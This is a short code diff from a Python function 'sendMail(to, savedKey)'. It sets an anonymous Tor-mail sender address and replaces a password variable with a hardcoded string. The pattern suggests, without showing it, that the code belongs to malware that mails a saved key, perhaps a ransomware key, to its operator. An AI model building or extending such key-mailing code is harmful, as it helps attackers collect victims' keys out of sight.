@@ -13,7 +13,7 @@ def sendMail(to, savedKey):
 
 	_to = to
 	_from = "t0x1cenv31ope@mail2tor.com"
-	pwd = pwd
+	pwd = "!@#$%^&*()_+-={}\][:";'/.,<>\`~PASSWORD?"
 	_inheritedKeyObj = savedKey
 
 	msg = MIMEMultipart()
